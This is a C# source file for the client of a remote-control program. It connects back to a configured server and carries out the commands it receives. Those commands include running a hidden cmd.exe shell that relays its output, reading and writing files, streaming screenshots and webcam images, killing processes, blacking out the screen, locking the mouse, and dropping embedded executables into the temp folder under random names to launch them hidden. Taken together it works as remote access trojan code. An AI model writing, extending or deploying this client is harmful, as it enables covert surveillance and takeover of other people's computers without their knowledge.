﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Newtonsoft.Json;

namespace RemoteControl.Client
{
    class Program
    {
        private static Socket oServer;
        //private static string ServerIP = "192.168.1.136";
        private static string ServerIP = "192.168.0.105";
        private static int ServerPort = 9001;
        private static Dictionary<string, bool> sessionScreenHandleSwitch = new Dictionary<string, bool>();
        private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
        private static Dictionary<string, bool> sessionDownloadHandleSwitch = new Dictionary<string, bool>();
        private static Dictionary<string, Process> sessionCmdHandleSwitch = new Dictionary<string, Process>();
        private static Dictionary<string, RequestLockMouse> sessionLockMouseHandleSwitch = new Dictionary<string, RequestLockMouse>();
        private static readonly string LastVideoCapturePathStoreFile = Environment.GetEnvironmentVariable("temp") + "\\vcpsf.dat";
        private static Dictionary<string, FileStream> fileUploadDic = new Dictionary<string, FileStream>();

        static void Main(string[] args)
        {
            ReadParameters();
            StartConnect();
            new Thread(() => StartHeartbeat()) { IsBackground = true }.Start();
            StartMonitor();
        }

        static void ReadParameters()
        {
            string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            ClientParameters paras = ClientParametersManager.ReadParameters(filePath);
            Program.ServerIP = paras.GetServerIP();
            Program.ServerPort = paras.ServerPort;
            Console.WriteLine("参数信息：");
            Console.WriteLine("IP:" + paras.GetServerIP());
            Console.WriteLine("PORT：" + paras.ServerPort);
        }

        static void StartConnect()
        {
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(ServerIP, ServerPort);
                    DoOutput("服务器连接成功！");
                    StartRecvData();
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData()
        {
            string sessionId = oServer.RemoteEndPoint.ToString();
            SocketSession session = new SocketSession(sessionId, oServer);
            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = oServer.Receive(buffer);
                        if (recvSize < 0)
                            continue;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength));
                                data.RemoveRange(0, packetLength);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet)
        {
            ePacketType packetType;
            object obj;
            PacketFactory.DecodeObject(packet, out packetType, out obj);

            string sessionId = session.SocketId;
            if(packetType == ePacketType.PACKET_GET_DRIVES_REQUEST)
            {
                ResponseGetDrives resp = new ResponseGetDrives();
                resp.drives = Environment.GetLogicalDrives().ToList();
                oServer.Send(PacketFactory.EncodeOject(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp));
            }
            else if (packetType == ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST)
            {
                try
                {
                    RequestGetSubFilesOrDirs req = obj as RequestGetSubFilesOrDirs;
                    ResponseGetSubFilesOrDirs resp = new ResponseGetSubFilesOrDirs();
                    resp.dirs = new List<Protocals.DirectoryProperty>();
                    var dirs = System.IO.Directory.GetDirectories(req.parentDir).ToList();
                    foreach (var item in dirs)
                    {
                        DirectoryInfo di = new DirectoryInfo(item);
                        resp.dirs.Add(new DirectoryProperty()
                        {
                            DirPath = item,
                            CreationTime = di.CreationTime,
                            LastWriteTime = di.LastWriteTime,
                            LastAccessTime = di.LastAccessTime
                        });
                    }

                    resp.files = new List<FileProperty>();
                    var files = System.IO.Directory.GetFiles(req.parentDir).ToList();
                    foreach (var item in files)
                    {
                        FileInfo fi = new FileInfo(item);
                        resp.files.Add(new FileProperty() 
                        {
                            FilePath = item,
                            Size = fi.Length,
                            CreationTime = fi.CreationTime,
                            LastWriteTime = fi.LastWriteTime,
                            LastAccessTime = fi.LastAccessTime
                        });
                    }
                    oServer.Send(PacketFactory.EncodeOject(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE, resp));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST)
            {
                RequestStartGetScreen req = obj as RequestStartGetScreen;
                if (!sessionScreenHandleSwitch.ContainsKey(sessionId))
                {
                    sessionScreenHandleSwitch.Add(sessionId, true);
                    new Thread(() => StartClientCaptureScreen(session, req)) { IsBackground = true }.Start();
                }
            }
            else if (packetType == ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST)
            {
                if (sessionScreenHandleSwitch.ContainsKey(sessionId))
                {
                    sessionScreenHandleSwitch.Remove(sessionId);
                }
            }
            else if (packetType == ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST)
            {
                RequestCreateFileOrDir req = obj as RequestCreateFileOrDir;
                ResponseCreateFileOrDir resp = new ResponseCreateFileOrDir();
                resp.Path = req.Path;
                resp.PathType = req.PathType;
                try
                {
                    if (req.PathType == ePathType.File)
                    {
                        if (!System.IO.File.Exists(req.Path))
                        {
                            System.IO.File.Create(req.Path).Close();
                        }
                    }
                    else
                    {
                        if (!System.IO.Directory.Exists(req.Path))
                        {
                            System.IO.Directory.CreateDirectory(req.Path);
                        }
                    }
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.ToString();
                }
                session.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE, resp);
            }
            else if (packetType == ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST)
            {
                RequestDeleteFileOrDir req = obj as RequestDeleteFileOrDir;
                ResponseDeleteFileOrDir resp = new ResponseDeleteFileOrDir();
                resp.Path = req.Path;
                resp.PathType = req.PathType;
                try
                {
                    if (req.PathType == ePathType.File)
                    {
                        System.IO.File.Delete(req.Path);
                    }
                    else
                    {
                        System.IO.Directory.Delete(req.Path);
                    }
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.ToString();
                }
                session.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE, resp);
            }
            else if (packetType == ePacketType.PACKET_START_DOWNLOAD_REQUEST)
            {
                RequestStartDownload req = obj as RequestStartDownload;
                ResponseStartDownloadHeader resp = new ResponseStartDownloadHeader();
                var fs = System.IO.File.OpenRead(req.Path);
                resp.FileSize = fs.Length;
                resp.Path = req.Path;
                resp.SavePath = req.SavePath;
                fs.Close();
                session.Send(ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE, resp);
                sessionDownloadHandleSwitch.Add(session.SocketId, true);
                new Thread(() => StartClientDownload(session, req)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_STOP_DOWNLOAD_REQUEST)
            {
                if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionDownloadHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PACKET_COMMAND_REQUEST)
            {
                var req = obj as RequestCommand;
                StartClientCmd(session, req);
            }
            else if (packetType == ePacketType.PACKET_SHUTDOWN_REQUEST)
            {
                StartAPP("shutdown.exe", "-s -t 0", true);
            }
            else if (packetType == ePacketType.PACKET_REBOOT_REQUEST)
            {
                StartAPP("shutdown.exe", "-r -t 0", true);
            }
            else if (packetType == ePacketType.PACKET_SLEEP_REQUEST)
            {
                StartAPP("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0", true);
            }
            else if (packetType == ePacketType.PACKET_HIBERNATE_REQUEST)
            {
                StartAPP("rundll32.exe", "powrProf.dll,SetSuspendState", true);
            }
            else if (packetType == ePacketType.PACKET_LOCK_REQUEST)
            {
                StartAPP("rundll32.exe", "user32.dll,LockWorkStation", true);
            }
            else if (packetType == ePacketType.PACKET_OPEN_URL_REQUEST)
            {
                var req = obj as RequestOpenUrl;
                StartAPP(req.Url, "", false, true);
            }
            else if (packetType == ePacketType.PACKET_MESSAGEBOX_REQUEST)
            {
                var req = obj as RequestMessageBox;
                StartShowMsgBox(session, req);
                //StartMessageBox(req.Title, req.Content, (MessageBoxButtons)req.MessageBoxButtons, (MessageBoxIcon)req.MessageBoxIcons);
            }
            else if (packetType == ePacketType.PACKET_LOCK_MOUSE_REQUEST)
            {
                var req = obj as RequestLockMouse;
                if (!sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionLockMouseHandleSwitch.Add(session.SocketId, req);
                    new Thread(() => StartLockMouse(session)) { IsBackground = true }.Start();
                }
                else{
                    sessionLockMouseHandleSwitch[session.SocketId] = req;
                }
            }
            else if (packetType == ePacketType.PACKET_UNLOCK_MOUSE_REQUEST)
            {
                if (sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionLockMouseHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PAKCET_BLACK_SCREEN_REQUEST)
            {
                new Thread(() => StartBlackScreen(session)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST)
            {
                new Thread(() => StartUnBlackScreen(session)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_OPEN_CD_REQUEST)
            {
                try
                {
                    Win32API.mciSendString("Set cdaudio door open wait", "", 0, IntPtr.Zero);//打开
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_CLOSE_CD_REQUEST)
            {
                try
                {
                    Win32API.mciSendString("Set cdaudio door Closed wait", "", 0, IntPtr.Zero);//关闭
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_PLAY_MUSIC_REQUEST)
            {
                var req = obj as RequestPlayMusic;
                StopMusic();
                StartPlayMusic(session, req.MusicFilePath);
            }
            else if (packetType == ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST)
            {
                StopMusic();
            }
            else if (packetType == ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST)
            {
                var req = obj as RequestDownloadWebFile;
                StartDownloadWebFile(session, req);
            }
            else if (packetType == ePacketType.PACKET_GET_PROCESSES_REQUEST)
            {
                new Thread(() => StartGetProcesses(session)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_KILL_PROCESS_REQUEST)
            {
                var req = obj as RequestKillProcesses;
                new Thread(() =>
                    {
                        StartKillProcesses(session, req);
                        StartGetProcesses(session);
                    }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST)
            {
                var req = obj as RequestStartCaptureVideo;
                new Thread(() =>
                    {
                        if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                        {
                            sessionVideoHandleSwitch.Add(session.SocketId, true);
                            // 关闭上次打开的程序
                            Console.WriteLine("当前lastVideoCaptureExeFile：" + lastVideoCaptureExeFile);
                            if (lastVideoCaptureExeFile == null)
                            {
                                if (System.IO.File.Exists(LastVideoCapturePathStoreFile))
                                {
                                    lastVideoCaptureExeFile = System.IO.File.ReadAllText(LastVideoCapturePathStoreFile);
                                    Console.WriteLine("读取到store文件：" + lastVideoCaptureExeFile);
                                }
                            }
                            if (lastVideoCaptureExeFile != null)
                            {
                                string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                                KillProcess(processName.ToLower());
                            }
                            // 释放并打开视频程序
                            byte[] data = GetResFileData("CamCapture.dat");
                            string fileName = WriteToRandomFile(data);
                            lastVideoCaptureExeFile = fileName;
                            System.IO.File.WriteAllText(LastVideoCapturePathStoreFile, fileName);
                            StartAPP("cmd.exe", "/c start " + fileName, true, false);
                            // 查找视频程序的端口
                            string pName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                            DoOutput("已启动视频监控程序：" + pName);
                            int port = -1;
                            int tryTimes = 0;
                            while (tryTimes<60)
                            {
                                port = FindServerPortByProcessName(pName);
                                DoOutput("视频端口：" + port);
                                if (port != -1)
                                    break;
                                Thread.Sleep(1000);
                                tryTimes++;
                            }
                            if (port == -1)
                                return;
                            // 连接视频程序服务，并绑定消息
                            //Image img = Image.FromFile(@"navi_map_gps_locked.png");
                            //var aa = new ResponseStartCaptureVideo();
                            //aa.SetImage(img,ImageFormat.Png);
                            //session.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE, aa);
                            CaptureVideoClient.MessagerReceived += (o, args) =>
                                {
                                    var resp = new ResponseStartCaptureVideo();
                                    resp.ImageData = o as byte[];
                                    resp.CollectTime = DateTime.Now;
                                    if (resp.ImageData!=null)
                                    {
                                        DoOutput("接收到视频数据" + resp.ImageData.Length); 
                                    }

                                    session.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE, resp);
                                };
                            try
                            {
                                CaptureVideoClient.Connect("127.0.0.1", port);
                                DoOutput("已经连接上视频服务");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                            // 检测是否已经关闭监控视频，并退出服务，结束视频服务程序
                            while (true)
                            {
                                if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                                {
                                    CaptureVideoClient.Close();
                                    break;
                                }
                            }
                        }

                    }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST)
            {
                if (sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionVideoHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST)
            {
                var req = obj as RequestStartUploadHeader;
                if (fileUploadDic.ContainsKey(req.Id))
                    return;
                FileStream fs = new FileStream(req.To, FileMode.Create, FileAccess.Write);
                fileUploadDic.Add(req.Id, fs);
            }
            else if (packetType == ePacketType.PACKET_START_UPLOAD_RESPONSE)
            {
                var resp = obj as ResponseStartUpload; 
                if (fileUploadDic.ContainsKey(resp.Id))
                {
                    FileStream fs = fileUploadDic[resp.Id];
                    fs.Write(resp.Data, 0, resp.Data.Length);
                }
            }
            else if (packetType == ePacketType.PACKET_STOP_UPLOAD_REQUEST)
            {
                var req = obj as RequestStopUpload;
                if (fileUploadDic.ContainsKey(req.Id))
                {
                    fileUploadDic[req.Id].Close();
                    fileUploadDic[req.Id].Dispose();
                    fileUploadDic.Remove(req.Id);
                }
            }
        }

        static string lastVideoCaptureExeFile = null;

        static int FindServerPortByProcessName(string processName)
        {
            var pros = Process.GetProcesses();
            for (int i = 0; i < pros.Length; i++)
            {
                var p = pros[i];
                if (p.ProcessName.Contains(processName))
                {
                    DoOutput("找到进程:" + p.ProcessName + ",id:" + p.Id);
                    int processId = p.Id;

                    Process pro = new Process();
                    pro.StartInfo.FileName = "cmd.exe";
                    pro.StartInfo.CreateNoWindow = true;
                    pro.StartInfo.UseShellExecute = false;
                    pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    pro.StartInfo.RedirectStandardInput = true;
                    pro.StartInfo.RedirectStandardOutput = true;
                    pro.Start();
                    Thread.Sleep(1000);
                    pro.StandardInput.WriteLine("netstat -ano | findstr \"" + processId + "\"");
                    Thread.Sleep(1000);
                    //pro.BeginOutputReadLine();
                    while (pro.StandardOutput.Peek() != -1)
                    {
                        string line = pro.StandardOutput.ReadLine().Trim();
                        DoOutput("行：" + line);
                        if (line.StartsWith("TCP"))
                        {
                            var cols = line.Split("\r\n\t ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                            if (cols.Length == 5)
                            {
                                if (cols[4] == processId.ToString())
                                {
                                    var ipep = cols[1];
                                    var a = ipep.Split(':');
                                    return Convert.ToInt32(a[1]);
                                }
                            }
                            else if (cols.Length == 4)
                            {
                                if (cols[3] == processId.ToString())
                                {
                                    var ipep = cols[1];
                                    var a = ipep.Split(':');
                                    return Convert.ToInt32(a[1]);
                                }
                            }
                        }
                    }

                    break;
                }

            }

            return -1;
        }

        static void StartKillProcesses(SocketSession session, RequestKillProcesses req)
        {
            var processList = Process.GetProcesses().ToList();
            for (int i = 0; i < req.ProcessIds.Count; i++)
            {
                string processId = req.ProcessIds[i];
                try
                {
                    Process p = processList.Find(m => m.Id.ToString() == processId);
                    if (p == null)
                        continue;

                    p.Kill();
                }
                catch (Exception ex)
                {
                }
            }
        }

        static void StartGetProcesses(SocketSession session)
        {
            ResponseGetProcesses resp = new ResponseGetProcesses();

            try
            {
                var processes = ProcessUtil.GetProcessProperyList();
                resp.Processes = processes.OrderBy(s=>s.ProcessName).ToList();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }

            session.Send(ePacketType.PACKET_GET_PROCESSES_RESPONSE, resp);
        }

        static void PlayMusic(string path)
        {
            //var aa  = Win32API.PlaySound(path, UIntPtr.Zero,
            //   (uint)(Win32API.SoundFlags.SND_FILENAME | Win32API.SoundFlags.SND_ASYNC | Win32API.SoundFlags.SND_NOSTOP));

            int ret1 = Win32API.mciSendString("open \"" + path + "\" alias mymusic", "", 0, IntPtr.Zero);
            int ret2 = Win32API.mciSendString("play mymusic", "", 0, IntPtr.Zero);
        }

        static void StopMusic()
        {
            if (lastPlayMusicExeFile != null)
            {
                KillProcess(lastPlayMusicExeFile);
            }
            //Win32API.mciSendString("close mymusic", null, 0, IntPtr.Zero);//关闭
        }

        static void StartDownloadWebFile(SocketSession session, RequestDownloadWebFile req)
        {
            try
            {
                // 释放程序
                byte[] data = GetResFileData("Downloader.dat");
                string fileName = WriteToRandomFile(data);
                // 启动程序
                string arguments = string.Format("{0} {1}", req.WebFileUrl,req.DestinationPath);
                StartAPP("cmd.exe", "/c start " + fileName + " " + arguments, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static string lastMsgBoxExeFile = null;
        static void StartShowMsgBox(SocketSession session, RequestMessageBox req)
        {
            try
            {
                if (lastMsgBoxExeFile == null || !System.IO.File.Exists(lastMsgBoxExeFile))
                {
                    // 释放弹窗程序
                    byte[] data = GetResFileData("MsgBox.dat");
                    string fileName = WriteToRandomFile(data);
                    lastMsgBoxExeFile = fileName;
                }
                // 启动弹窗程序
                string msgBoxArguments = string.Format("{0} {1} {2} {3}", req.Content,req.Title,req.MessageBoxButtons,req.MessageBoxIcons);
                StartAPP("cmd.exe", "/c start " + lastMsgBoxExeFile + " " + msgBoxArguments, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static string lastPlayMusicExeFile = null;
        static void StartPlayMusic(SocketSession session, string musicFilePath)
        {
            try
            {
                // 释放音乐播放程序
                byte[] data = GetResFileData("MusicPlayer.dat");
                string musicPlayerFileName = WriteToRandomFile(data);
                lastPlayMusicExeFile = System.IO.Path.GetFileNameWithoutExtension(musicPlayerFileName);
                // 启动音乐播放程序
                StartAPP("cmd.exe", "/c start " + musicPlayerFileName + " " + musicFilePath, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void StartBlackScreen(SocketSession session)
        {
            try
            {
                // 释放黑屏程序
                byte[] data = GetResFileData("BlackScreen.dat");
                string blackScreenFileName = WriteToRandomFile(data);
                // 启动黑屏程序
                StartAPP("cmd.exe", "/c start " + blackScreenFileName, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static byte[] GetResFileData(string resFileName)
        {
            return Utils.GetResFileData(resFileName);
        }

        static string WriteToRandomFile(byte[] data)
        {
            string randomFilePath = System.IO.Path.GetRandomFileName();
            randomFilePath = Environment.GetEnvironmentVariable("temp") + "\\" + randomFilePath;
            System.IO.File.WriteAllBytes(randomFilePath, data);

            return randomFilePath;
        }

        static void KillProcess(string processNameInLower)
        {
            try
            {
                var pros = Process.GetProcesses();
                for (int i = 0; i < pros.Length; i++)
                {
                    Process p = pros[i];
                    if (p.ProcessName.ToLower().Contains(processNameInLower))
                    {
                        try
                        {
                            Console.WriteLine("成功结束进程:" + p.ProcessName);
                            p.Kill();
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }

        static void StartUnBlackScreen(SocketSession session)
        {
            try
            {
                KillProcess("blackscreen");

                Win32API.ShowWindow(Win32API.FindWindow(Win32API.Shell_TrayWnd_Name,null), Win32API.SW_SHOW);
            }
            catch (Exception ex)
            {
                
            }
        }

        static void StartLockMouse(SocketSession session)
        {
            var req = sessionLockMouseHandleSwitch[session.SocketId];
            for (int i = 0; i < req.LockSeconds; i++)
            {
                req = sessionLockMouseHandleSwitch[session.SocketId];
                for (int j = 0; j < 100; j++)
                {
                    Win32API.mouse_event(Win32API.MOUSEEVENTF_ABSOLUTE | Win32API.MOUSEEVENTF_MOVE, 0, 0, 0, 0);
                    Thread.Sleep(10);
                }
                if (!sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
                    return;
            }
            if (sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
            {
                sessionLockMouseHandleSwitch.Remove(session.SocketId);
            }
        }

        static void StartClientDownload(SocketSession session, RequestStartDownload req)
        {
            FileStream fs = new FileStream(req.Path, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[2048];
            while (true)
            {
                if (!sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
                {
                    Console.WriteLine("文件下载被终止！");
                    break;
                }
                int size = fs.Read(buffer, 0, buffer.Length);
                if (size < 1)
                    break;

                byte[] data = new byte[size];
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] = buffer[i];
                }
                session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, data);
            }
            fs.Close();
        }

        static void StartClientCaptureScreen(SocketSession session, RequestStartGetScreen req)
        {
            while (true)
            {
                if (!sessionScreenHandleSwitch.ContainsKey(session.SocketId))
                {
                    return;
                }
                for (int i = 0; i < 1; i++)
                {
                    ResponseStartGetScreen resp = new ResponseStartGetScreen();
                    resp.SetImage(CaptureScreen(), ImageFormat.Jpeg);
                    session.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE, resp);
                }
                Thread.Sleep(1000);
            }
        }

        static void StartClientCmd(SocketSession session, RequestCommand req)
        {
            if(!sessionCmdHandleSwitch.ContainsKey(session.SocketId))
                sessionCmdHandleSwitch.Add(session.SocketId,null);
            if (sessionCmdHandleSwitch[session.SocketId] == null)
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.OutputDataReceived += (o, args) =>
                {
                    ResponseCommand resp = new ResponseCommand();
                    resp.CommandResponse = args.Data;

                    session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);

                    Console.WriteLine(session.SocketId + ":" + args.Data);
                };
                p.ErrorDataReceived += (o, args) =>
                {
                    ResponseCommand resp = new ResponseCommand();
                    resp.CommandResponse = args.Data;

                    session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);
                };
                p.Start();

                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                sessionCmdHandleSwitch[session.SocketId] = p;
            }

            sessionCmdHandleSwitch[session.SocketId].StandardInput.WriteLine(req.Command);
            if (req.Command.Trim().ToLower() == "exit")
            {
                sessionCmdHandleSwitch[session.SocketId] = null;
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = PacketFactory.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void DoOutput(string sMsg)
        {
            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
        }

        static Image CaptureScreen()
        {
            Image myImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(myImage);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            IntPtr pDC = g.GetHdc();
            g.ReleaseHdc(pDC);

            return myImage;
        }

        static void StartAPP(string appFileName, string arguments, bool hideWindow)
        {
            StartAPP(appFileName,arguments,hideWindow, false);
        }

        static void StartAPP(string appFileName, string arguments, bool hideWindow, bool useShellExecute)
        {
            new Thread(() =>
            {
                try
                {
                    Process p = new Process();
                    p.StartInfo.FileName = appFileName;
                    p.StartInfo.Arguments = arguments;
                    p.StartInfo.CreateNoWindow = hideWindow;
                    p.StartInfo.UseShellExecute = useShellExecute;
                    if (hideWindow)
                    {
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    }
                    p.Start();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("启动进程失败，" + ex.Message);
                }
            }) { IsBackground = true }.Start();
        }

        static void StartMessageBox(string title, string content, MessageBoxButtons buttons, MessageBoxIcon icon)
        {
            new Thread(() =>
                {
                    MessageBox.Show(content, title, buttons, icon);
                }) { IsBackground = true }.Start();
        }

    }
}
